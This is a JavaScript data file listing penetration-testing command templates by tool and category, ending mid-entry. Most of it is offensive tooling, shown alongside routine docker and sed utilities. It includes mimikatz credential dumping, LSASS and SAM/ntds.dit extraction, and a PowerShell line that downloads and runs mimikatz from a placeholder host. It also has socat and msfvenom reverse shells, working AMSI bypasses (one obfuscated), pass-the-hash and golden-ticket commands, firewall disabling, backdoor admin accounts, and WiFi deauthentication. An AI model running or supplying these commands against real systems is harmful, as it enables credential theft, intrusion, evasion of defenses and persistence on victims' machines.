var data = [
    {
        "id": 1,
        "tool": "WPSCAN",
        "category": "RECON",
        "information": "Scan wordpress web site with wpscan",
        "command": "wpscan --proxy http://127.0.0.1:8080 --url [url] --disable-tls-checks -e ap,tt,cb,dbe,u1-20,m --api-token [wpscan_apitoken]",
        "link": "https://github.com/wpscanteam/wpscan"
    },
    {
        "id": 2,
        "tool": "drupwn",
        "category": "RECON",
        "information": "Scan drupal web site with drupwn",
        "command": "drupwn --users --nodes --modules --dfiles --themes enum [url]",
        "link": "https://github.com/immunIT/drupwn"
    },
    {
        "id": 3,
        "tool": "WEB",
        "category": "RECON",
        "information": "Extract all links from a web page",
        "command": "curl -k -s [url] | grep -o 'http://[^\"]*' | cut -d \"/\" -f 3 | sort -u"
    },
    {
        "id": 4,
        "tool": "gobuster",
        "category": "ATTACK/FUZZ",
        "information": "Fuzz a web site with gobuster with classic extensions",
        "command": "gobuster dir -u [url] -w [wordlist] -x php,html,txt,xml,md [add_other] -o [outputfile]",
        "link": "https://github.com/OJ/gobuster"
    },
    {
        "id": 5,
        "tool": "ffuf",
        "category": "ATTACK/FUZZ",
        "information": "Fuzz a web site with ffuf with classic extensions",
        "command": "ffuf -u [url]/FUZZ -w [wordlist]",
        "link": "https://github.com/ffuf/ffuf"
    },
    {
        "id": 6,
        "tool": "ffuf",
        "category": "ATTACK/FUZZ",
        "information": "Fuzz a web site with ffuf with a custom header and response size and code filter",
        "command": "ffuf -u [url]/FUZZ -w [wordlist] -H 'Cookie: [cookie]' -fs [size] -fc [code]",
        "link": "https://github.com/ffuf/ffuf"
    },
    {
        "id": 7,
        "tool": "ffuf",
        "category": "ATTACK/FUZZ",
        "information": "Fuzz a web site with ffuf with a post data",
        "command": "ffuf -u [url] -w [wordlist] -X POST -d '[data]'",
        "link": "https://github.com/ffuf/ffuf"
    },
    {
        "id": 8,
        "tool": "JwtTool",
        "category": "RECON",
        "information": "Bruteforce a JWT token key",
        "command": "python3 jwt_tool.py -d [wordlist] [token]",
        "link": "https://github.com/ticarpi/jwt_tool"
    },
    {
        "id": 9,
        "tool": "JwtTool",
        "category": "RECON",
        "information": "JWT tool perform all test on a token",
        "command": "python3 jwt_tool.py -M at -t \"[url]\" -rh \"Authorization: Bearer [JWT_Token]\" -rh \"[other_header]\" -rc \"[cookies]\"",
        "link": "https://github.com/ticarpi/jwt_tool"
    },
    {
        "id": 10,
        "tool": "sed",
        "category": "UTILS",
        "information": "Replace multiple space to one",
        "command": "sed -e 's/  */ /g'"
    },
    {
        "id": 11,
        "tool": "sed",
        "category": "UTILS",
        "information": "Remove the last char",
        "command": "sed 's/.$//'"
    },
    {
        "id": 12,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract md5 hash ({32})",
        "command": "egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' [file] | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt"
    },
    {
        "id": 13,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract sha1 hash ({40})",
        "command": "egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{40}([^a-fA-F0-9]|$)' [file] | egrep -o '[a-fA-F0-9]{40}' > sha1-hashes.txt"
    },
    {
        "id": 14,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract sha256 hash ({64})",
        "command": "egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{64}([^a-fA-F0-9]|$)' [file] | egrep -o '[a-fA-F0-9]{64}' > sha256-hashes.txt"
    },
    {
        "id": 15,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract sha512 hash ({128})",
        "command": "egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{128}([^a-fA-F0-9]|$)' [file] | egrep -o '[a-fA-F0-9]{128}' > sha512-hashes.txt"
    },
    {
        "id": 16,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract valid MySQL-old hash",
        "command": "grep -e \"[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}\" [file] > mysql-old-hashes.txt"
    },
    {
        "id": 17,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract valid blowfish hash",
        "command": "grep -e \"$2a\\$\\08\\$(.){75}\" [file] > blowfish-hashes.txt"
    },
    {
        "id": 18,
        "tool": "Others grep",
        "category": "UTILS",
        "information": "Extract emails from file",
        "command": "grep -E -o \"\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\\b\" [file]"
    },
    {
        "id": 19,
        "tool": "Others grep",
        "category": "UTILS",
        "information": "Extract IP from file",
        "command": "grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" file.txt"
    },
    {
        "id": 20,
        "tool": "Compile",
        "category": "CODE/COMPILE",
        "information": "Compile windows PE executable on linux",
        "command": "i686-w64-mingw32-gcc -o [output] [source] -lws2_32"
    },
    {
        "id": 22,
        "tool": "QR code",
        "category": "UTILS",
        "information": "Create a QR code",
        "command": "echo [content] | curl -F-=\<- qrenco.de"
    },
    {
        "id": 23,
        "tool": "linux bash",
        "category": "UTILS",
        "information": "Search and replace within a file",
        "command": "sed -i 's/[search]/[replace]/g' [file]"
    },
    {
        "id": 24,
        "tool": "linux bash",
        "category": "UTILS",
        "information": "Copy file frome remote server to local",
        "command": "scp [user]@[remote]:[file] [local]"
    },
    {
        "id": 25,
        "tool": "linux bash",
        "category": "UTILS",
        "information": "Copy file from local to remote server",
        "command": "scp [file] [user]@[remote]:[path]"
    },
    {
        "id": 26,
        "tool": "procdump",
        "category": "POST-EXPLOITATION",
        "information": "Dump a process memory - local",
        "command": "procdump.exe -accepteula -ma [pid or name] [output]"
    },
    {
        "id": 27,
        "tool": "procdump",
        "category": "POST-EXPLOITATION",
        "information": "Dump a process memory - remote",
        "command": "net use Z: https://live.sysinternals.com; Z:\\procdump.exe -accepteula -ma [lsass_exe] [lsass_dmp]"
    },
    {
        "id": 28,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION/CREDS_RECOVER",
        "information": "mimikatz one liner",
        "command": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 29,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION/CREDS_RECOVER",
        "information": "load mimikatz in memory",
        "command": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://[ip]/mimikatz.ps1')\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 30,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION/CREDS_RECOVER",
        "information": "mimikatz disable ppl and dump password",
        "command": "mimikatz.exe \"privilege::debug\" \"!+\" \"!processprotect /process:lsass.exe /remove\" \"sekurlsa::logonpasswords\" \"exit\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },

    {
        "id": 31,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION/CREDS_RECOVER",
        "information": "mimikatz extract credentials from dump",
        "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords\" \"exit\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 32,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION/CREDS_RECOVER",
        "information": "mimikatz extract credentials from shadow copy (1)",
        "command": "mimikatz.exe \"lsadump::sam /system:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY /sam:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 33,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION/CREDS_RECOVER",
        "information": "mimikatz extract credentials from shadow copy (2)",
        "command": "mimikatz.exe \"lsadump::secrets /system:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 34,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION/CREDS_RECOVER",
        "information": "mimikatz extract tickets",
        "command": "mimikatz.exe \"sekurlsa::tickets /export\" \"exit\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 35,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION/CREDS_RECOVER",
        "information": "mimikatz - forest extra SID",
        "command": "kerberos::golden /user:[user] /domain:[domain] /sid:[child_sid] /krbtgt:[krbtgt_ntlm] /sids:[parent_sid]-519 /ptt",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 36,
        "tool": "mimikatz",
        "category": "PIVOTING",
        "information": "mimikatz pth to RDP mstsc.exe",
        "command": "sekurlsa::pth /user:[user] /domain:<domain> /ntlm:<ntlm_hash> /run:\"mstsc.exe /restrictedadmin\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 37,
        "tool": "mimikatz",
        "category": "PIVOTING",
        "information": "mimikatz pth run powershell remotelly",
        "command": "sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[ntlm_hash] /run:\"powershell.exe -exec bypass\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 38,
        "tool": "socat",
        "category": "PIVOTING",
        "information": "socat port forwarding listener (on local machine)",
        "command": "./socat TCP-LISTEN:[port_listener],fork,reuseaddr TCP-LISTEN:[port_to_forward]",
        "link": "http://www.dest-unreach.org/socat/"
    },
    {
        "id": 39,
        "tool": "socat",
        "category": "PIVOTING",
        "information": "socat port forwarding connect (on remote machine)",
        "command": "socat TCP:[connect_ip]:[connect_port] TCP:127.0.0.1:[port_to_forward]",
        "link": "http://www.dest-unreach.org/socat/"
    },
    {
        "id": 40,
        "tool": "socat",
        "category": "PIVOTING",
        "information": "socat reverse shell (remote victime)",
        "command": "./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[listner_ip]:[listner_port]",
        "link": "http://www.dest-unreach.org/socat/"
    },
    {
        "id": 41,
        "tool": "socat",
        "category": "PIVOTING",
        "information": "socat reverse shell (local listener)",
        "command": "socat file:`tty`,raw,echo=0 tcp-listen:[port|4444]",
        "link": "http://www.dest-unreach.org/socat/"
    },
    {
        "id": 42,
        "tool": "chisel",
        "category": "PIVOTING",
        "information": "chisel server (server on local machine)",
        "command": "chisel server -p [port] --reverse",
        "link": "https://github.com/jpillora/chisel"
    },
    {
        "id": 43,
        "tool": "chisel",
        "category": "PIVOTING",
        "information": "chisel reverse port forwarding (client on remote machine) - forward client port on server",
        "command": "chisel client -v [server_ip]:[server_port] R:[serverside_port]:[clientside_host|localhost]:[clientside_port]",
        "link": "https://github.com/jpillora/chisel"
    },
    {
        "id": 44,
        "tool": "chisel",
        "category": "PIVOTING",
        "information": "chisel remote port forwarding (client on remote machine) - forward server port on client",
        "command": "chisel client -v [server_ip]:[server_port|8000] [clientside_host|0.0.0.0]:[clientside_port]:[serverside_host|127.0.0.1]:[serverside_port]",
        "link": "https://github.com/jpillora/chisel"
    },
    {
        "id": 45,
        "tool": "chisel",
        "category": "PIVOTING",
        "information": "chisel socks proxy (client on remote machine)",
        "command": "chisel client [server_ip]:[server_port] R:socks",
        "link": "https://github.com/jpillora/chisel"
    },
    {
        "id": 46,
        "tool": "docker",
        "category": "UTILS",
        "information": "Remove docker image",
        "command": "docker image rm [image_id]",
    },
    {
        "id": 47,
        "tool": "docker",
        "category": "UTILS",
        "information": "Delete an image from the local image store",
        "command": "docker rmi [image_id]",
    },
    {
        "id": 48,
        "tool": "docker",
        "category": "UTILS",
        "information": "List all images that are locally stored with the Docker Engine",
        "command": "docker images",
    },
    {
        "id": 49,
        "tool": "docker",
        "category": "UTILS",
        "information": "List all containers that are locally stored with the Docker Engine",
        "command": "docker ps -a",
    },
    {
        "id": 51,
        "tool": "docker",
        "category": "UTILS",
        "information": "List all containers that are currently running",
        "command": "docker ps -q",
    },
    {
        "id": 53,
        "tool": "docker",
        "category": "UTILS",
        "information": "Stop a running container",
        "command": "docker stop [container_id]",
    },
    {
        "id": 54,
        "tool": "docker",
        "category": "UTILS",
        "information": "Stop all running containers",
        "command": "docker stop $(docker ps -a -q)",
    },
    {
        "id": 55,
        "tool": "docker",
        "category": "UTILS",
        "information": "Build an image from the Dockerfile in the current directory and tag the image",
        "command": "docker build -t [image_name] .",
    },
    {
        "id": 56,
        "tool": "docker",
        "category": "UTILS",
        "information": "Pull an image from a registry",
        "command": "docker pull [image_name]:[tag]",
    },
    {
        "id": 57,
        "tool": "docker",
        "category": "UTILS",
        "information": "Create a new bash process inside the container and connect it to the terminal",
        "command": "docker exec -it [container_id] bash",
    },
    {
        "id": 58,
        "tool": "docker",
        "category": "UTILS",
        "information": "Print the last lines of a container’s logs",
        "command": "docker logs --tail 100 [container_id] | less",
    },
    {
        "id": 59,
        "tool": "docker",
        "category": "UTILS",
        "information": "Print the last lines of a container’s logs and follow",
        "command": "docker logs -f --tail 100 [container_id]",
    },
    {
        "id": 60,
        "tool": "docker",
        "category": "UTILS",
        "information": "Create new network",
        "command": "docker network create [network_name]",
    },
    {
        "id": 61,
        "tool": "docker",
        "category": "UTILS",
        "information": "List all networks",
        "command": "docker network ls",
    },
    {
        "id": 62,
        "tool": "docker",
        "category": "UTILS",
        "information": "Builds, (re)creates, starts, and attaches to containers for all services",
        "command": "docker-compose up",
    },
    {
        "id": 63,
        "tool": "docker",
        "category": "UTILS",
        "information": "Builds, (re)creates, starts, and dettaches to containers for all services",
        "command": "docker-compose up -d",
    },
    {
        "id": 64,
        "tool": "docker",
        "category": "UTILS",
        "information": "Stops containers and removes containers, networks, volumes, and images created by up",
        "command": "docker-compose down",
    },
    {
        "id": 65,
        "tool": "windows",
        "category": "RECON",
        "information": "whitelisting bypass with installutil",
        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U [full_path_to_app]",
    },
    {
        "id": 66,
        "tool": "windows",
        "category": "PRIVESC",
        "information": "Find password - group policy preference (ms14-025)",
        "command": "findstr /S /I cpassword \\[FQDN]\\sysvol\\[FQDN]\\policies\*.xml",
    },
    {
        "id": 67,
        "tool": "windows",
        "category": "PRIVESC",
        "information" : "Show lsa cached credentials",
        "command": "reg query \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\" ",
    },
    {
        "id": 68,
        "tool": "windows",
        "category": "PRIVESC",
        "information" : "Register query extract SAM",
        "command": "reg save HKLM\\SAM 'C:\\Windows\\Temp\\sam.save';reg save HKLM\\SECURITY 'C:\\Windows\\Temp\\security.save';reg save HKLM\\SYSTEM 'C:\\Windows\\Temp\\system.save'",
    },
    {
        "id": 69,
        "tool": "windows",
        "category": "PRIVESC",
        "information" : "Find weak folder permission",
        "command": "accesschk.exe -uwdqs Users <c>:\\",
    },
    {
        "id": 70,
        "tool": "windows",
        "category": "PRIVESC",
        "information" : "Find weak file permission",
        "command": "accesschk.exe -uwqs Users <c>:\\",
    },
    {
        "id": 71,
        "tool": "windows",
        "category": "PERSIST",
        "information": "Add user",
        "command": "net user [username] [password] /add",
    },
    {
        "id": 72,
        "tool": "windows",
        "category": "PERSIST",
        "information": "Add user to domain",
        "command": "net user [username] [password] /add /domain",
    },
    {
        "id": 73,
        "tool": "windows",
        "category": "PERSIST",
        "information": "Add user as admin",
        "command": "net localgroup administrators [username] /add",
    },
    {
        "id": 74,
        "tool": "windows",
        "category": "PERSIST",
        "information": "Run as over user",
        "command": "runas /user:[domain]\\[username] [command|cmd.exe]",
    },
    {
        "id": 75,
        "tool": "windows",
        "category": "RECON",
        "information": "Infos about password policy",
        "command": "net accounts",
    },
    {
        "id": 76,
        "tool": "windows",
        "category": "RECON",
        "information": "Get domain name",
        "command": "echo %USERDOMAIN%",
    },
    {
        "id": 77,
        "tool": "windows",
        "category": "RECON",
        "information": "Get domain name (2)",
        "command": "echo %USERSDNSDOMAIN%",
    },
    {
        "id": 78,
        "tool": "windows",
        "category": "RECON",
        "information": "Get computer domain name",
        "command": "systeminfo | findstr /B /C:\"Domain\"",
    },
    {
        "id": 79,
        "tool": "windows",
        "category": "RECON",
        "information": "Get name of the DC",
        "command": "echo %logonserver%",
    },
    {
        "id": 80,
        "tool": "windows",
        "category": "RECON",
        "information": "List of group domain",
        "command": "net group /domain",
    },
    {
        "id": 81,
        "tool": "windows",
        "category": "RECON",
        "information": "List of computer connected to the domain",
        "command": "net group \"domain computers\" /domain",
    },
    {
        "id": 82,
        "tool": "windows",
        "category": "RECON",
        "information": "List all PCs of the domain",
        "command": "net view /domain",
    },
    {
        "id": 83,
        "tool": "windows",
        "category": "RECON",
        "information": "List users with domain admin privileges",
        "command": "net group \"domain admins\" /domain",
    },
    {
        "id": 84,
        "tool": "windows",
        "category": "RECON",
        "information": "List all domain users",
        "command": "net user /domain",
    },
    {
        "id": 85,
        "tool": "windows",
        "category": "RECON",
        "information": "Get user domain information",
        "command": "net user [username] /domain",
    },
    {
        "id": 86,
        "tool": "windows",
        "category": "RECON",
        "information": "Print all route",
        "command": "route print",
    },
    {
        "id": 87,
        "tool": "windows",
        "category": "RECON",
        "information": "List of known host",
        "command": "arp -a",
    },
    {
        "id": 88,
        "tool": "windows",
        "category": "RECON",
        "information": "List open port",
        "command": "netstat -ano",
    },
    {
        "id": 89,
        "tool": "windows",
        "category": "RECON",
        "information": "Turn off firewall",
        "command": "netsh advfirewall set allprofiles state off",
    },
    {
        "id": 90,
        "tool": "windows",
        "category": "RECON",
        "information": "Turn on firewall (2)",
        "command": "netsh firewall set opmode disable",
    },
    {
        "id ": 91,
        "tool": "windows",
        "category": "RECON",
        "information": "Dump ntds.dit (Windows >= 2008 server) - method 1",
        "command": "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q",
    },
    {
        "id": 92,
        "tool": "windows",
        "category": "RECON",
        "information": "Dump ntds.dit (Windows >= 2008 server) - method 2",
        "command": "esentutl.exe /y /vss c:\\windows\ntds\ntds.dit /d c:\\folder\\ntds.dit",
    },
    {
        "id": 93,
        "tool": "windows",
        "category": "RECON",
        "information": "Dump ntds.dit (Windows <= 2003 server)",
        "command": "net start vss && vssadmin create shadow /for=c: && vssadmin list shadows && copy \\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\ntds\\ntds.dit C:\\temp",
    },
    {
        "id": 94,
        "tool": "windows",
        "category": "RECON",
        "information": "List of conputer shares on the domain",
        "command": "net view /all /domain [domain_name]",
    },
    {
        "id": 95,
        "tool": "windows",
        "category": "RECON",
        "information": "List share of a computer",
        "command": "net view \\\\[computer_name] /all",
    },
    {
        "id": 96,
        "tool": "windows",
        "category": "RECON",
        "information": "Mount share locally",
        "command": "net use [drive_letter]: \\\\[computer_name]\\[share_name]",
    },
    {
        "id": 97,
        "tool": "powershell",
        "category": "RECON",
        "information": "Bypass AMSI with _amsiContext_ (powershell only)",
        "command": "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)",
    },
    {
        "id": 98,
        "tool": "powershell",
        "category": "RECON",
        "information": "Bypass AMSI with _AmsiInitFailed_ (powershell only)",
        "command": "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*InitFailed\") {$f=$e}};$f.SetValue($null,$true)",
    },
    {
        "id": 99,
        "tool": "powershell",
        "category": "RECON",
        "information": "Bypass AMSI by patching (work for .NET binaries too)",
        "command": "$ZQCUW = @\"\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\n\r\npublic class ZQCUW {\r\n    [DllImport(\"kernel32\")]\r\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\r\n\r\n    [DllImport(\"kernel32\")]\r\n    public static extern IntPtr LoadLibrary(string name);\r\n\r\n    [DllImport(\"kernel32\")]\r\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\r\n};\r\n\"@\r\n\r\nAdd-Type $ZQCUW;\r\n\r\n$BBWHVWQ = [ZQCUW]::LoadLibrary(\"$([System.Net.WebUtility]::HtmlDecode('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))\");\r\n\r\n$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, \"$([System.Net.WebUtility]::HtmlDecode('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))\");\r\n\r\n$p = 0;\r\n\r\n[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p);\r\n\r\n$TLML = \"0xB8\";\r\n$PURX = \"0x57\";\r\n$YNWL = \"0x00\";\r\n$RTGX = \"0x07\";\r\n$XVON = \"0x80\";\r\n$WRUD = \"0xC3\";\r\n\r\n$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)"
    },
    {
        "id": 100,
        "tool": "sqlmap",
        "category": "ATTACK/INJECTION",
        "information": "SQLMap - classic with tamper",
        "command": "sqlmap -u '[url]' tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes",
    },
    {
        "id": 101,
        "tool": "sqlmap",
        "category": "ATTACK/INJECTION",
        "information": "SQLMap - mysql tamper list",
        "command": "sqlmap -u '[url]' --dbms=MYSQL tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes"
    },
    {
        "id": 102,
        "tool": "sqlmap",
        "category": "ATTACK/INJECTION",
        "information": "SQLMap - mssql tamper list",
        "command": "sqlmap -u '[url]' --dbms=MSSQL tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor"
    },
    {
        "id": 103,
        "tool": "Metasploit - msf",
        "category": "ATTACK/CONNECT",
        "information": "Upgrade session to meterpreter",
        "command": "sessions -u [session_id]",
    },
    {
        "id": 104,
        "tool": "Metasploit - msf",
        "category": "PIVOTING/TUNEL-PORTFW",
        "information": "Add pivot (autoroute)",
        "command": "use multi/manage/autoroute",
    },
    {
        "id": 105,
        "tool": "Metasploit - msf",
        "category": "PIVOTING/TUNEL-PORTFW",
        "information": "Add socks proxy (autoroute first)",
        "command": "use auxiliary/server/socks_proxy",
    },
    {
        "id": 106,
        "tool": "nmap",
        "category": "RECON",
        "information": "Nmap - hosts alive",
        "command": "nmap -sn [ip_range]",
        "link": "https://nmap.org/"
    },
    {
        "id": 107,
        "tool": "nmap",
        "category": "RECON",
        "information": "Nmap - classic scan",
        "command": "nmap -sC -sV [ip]",
        "link": "https://nmap.org/"
    },
    {
        "id": 108,
        "tool": "nmap",
        "category": "RECON",
        "information": "Nmap - read targets from file",
        "command": "nmap -iL [file]",
        "link": "https://nmap.org/"
    },
    {
        "id": 109,
        "tool": "nmap",
        "category": "RECON",
        "information": "Nmap - scan all port full",
        "command": "nmap -Pn -sC -sV -p [port] [ip] -oN scan.txt --reason --script=vuln",
        "link": "https://nmap.org/"
    },
    {
        "id": 110,
        "tool": "nmap",
        "category": "RECON",
        "information": "Nmap - UDP scan",
        "command": "nmap -sU [ip]",
        "link": "https://nmap.org/"
    },
    {
        "id": 111,
        "tool": "masscan",
        "category": "RECON",
        "information": "masscan - scan all port",
        "command": "masscan -p1-65535 [ip] -e [interface] --rate 1000",
        "link": "https://github.com/robertdavidgraham/masscan"
    },
    {
        "id": 112,
        "tool": "nmap",
        "category": "RECON",
        "information": "Nmap - SMB signin disabled",
        "command": "nmap -Pn -sS -T4 --open --script smb-security-mode -p 445 [ip]",
    },
    {
        "id": 113,
        "tool": "wifi",
        "category": "ATTACK",
        "information": "airmon - start monitor mode",
        "command": "airmon-ng start [interface]",
        "link": "https://www.aircrack-ng.org/"
    },
    {
        "id": 114,
        "tool": "wifi",
        "category": "ATTACK",
        "information": "airodump - capture wifi",
        "command": "airodump-ng [interface]",
        "link": "https://www.aircrack-ng.org/"
    },
    {
        "id": 115,
        "tool": "wifi",
        "category": "ATTACK",
        "information": "aireplay - deauth",
        "command": "aireplay-ng --deauth 0 -a [bssid] [interface]",
        "link": "https://www.aircrack-ng.org/"
    },
    {
        "id": 116,
        "tool": "wifi",
        "category": "ATTACK",
        "information": "aircrack - crack wifi",
        "command": "aircrack-ng -w [wordlist] -b [bssid] [file.cap]",
        "link": "https://www.aircrack-ng.org/"
    },
    {
        "id": 117,
        "tool": "wifi",
        "category": "ATTACK",
        "information": "airbase - fake AP",
        "command": "airbase-ng -e [ssid] -c [channel] [interface]",
        "link": "https://www.aircrack-ng.org/"
    },
    {
        "id": 118,
        "tool": "msfvenom",
        "category": "ATTACK/REVERSE_SHELL",
        "information": "msfvenom - payload windows x86 meterpeter unstagged",
        "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f exe -o [output.exe]",
        "link": "https://www.metasploit.com/"
    },
    {
        "id": 119,
        "tool": "msfvenom",
        "category": "ATTACK/REVERSE_SHELL",
        "information": "msfvenom - linux meterpeter reverse shell",
        "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f elf -o [output.elf]",
        "link": "https://www.metasploit.com/"
    },
    {
        "id": 120,
        "tool": "msfvenom",
        "category": "ATTACK/REVERSE_SHELL",
        "information": "msfvenom - Linux x64 meterpreter reverse shell",
        "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f elf -t 300 -e x64/xor_dynamic -o [output.elf]",
        "link": "https://www.metasploit.com/"
    },
    {
        "id": 121,
        "tool": "msfvenom",
        "category": "ATTACK/REVERSE_SHELL",
        "information": "msfvenom - PHP meterpreter reverse shell",
        "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST=[ip] LPORT=[port] -f raw -o [output.php]",
        "link": "https://www.metasploit.com/"
    },
    {
        "id": 122,
        "tool": "Metasploit - msf",
        "category": "ATTACK/REVERSE_SHELL",
        "information": "Metasploit - Handler windows https 64bits stagged - encoded xor",
        "command": "msfconsole -x \"use exploits/multi/handler; set lhost 192.168.1.0/24; set lport 443; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; exploit\"",
        "link": "https://www.metasploit.com/"
    },
    {
        "id": 123,
        "tool": "NetExec",
        "category": "RECON",
        "information": "NetExec - enumerate hosts, network",
        "command": "nxc smb [ip_range]",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 124,
        "tool": "NetExec",
        "category": "RECON",
        "information": "NetExec - enumerate password policy",
        "command": "nxc smb 10.10.10.161 -u '[user]' -p '[password]' --pass-pol",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 125,
        "tool": "NetExec",
        "category": "RECON",
        "information": "NetExec - enumerate null session",
        "command": "nxc smb [ip] -u '' -p ''",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 125,
        "tool": "NetExec",
        "category": "RECON",
        "information": "NetExec - enumerate anonymouse login",
        "command": "nxc smb [ip] -u 'a' -p ''",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 126,
        "tool": "NetExec",
        "category": "RECON",
        "information": "NetExec - enumerate active session",
        "command": "nxc smb [ip] -u '[user]' -p '[password]' --sessions",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 127,
        "tool": "NetExec",
        "category": "RECON",
        "information": "NetExec - enumerate domain users",
        "command": "nxc smb [ip] -u '[user]' -p '[password]' --users",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 128,
        "tool": "NetExec",
        "category": "RECON",
        "information": "NetExec - enumerate users by bruteforce the RID",
        "command": "nxc smb [ip] -u '[user]' -p '[password]' --rid-brute",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 129,
        "tool": "NetExec",
        "category": "RECON",
        "information": "NetExec - enumerate domain groups",
        "command": "nxc smb [ip] -u '[user]' -p '[password]' --groups",
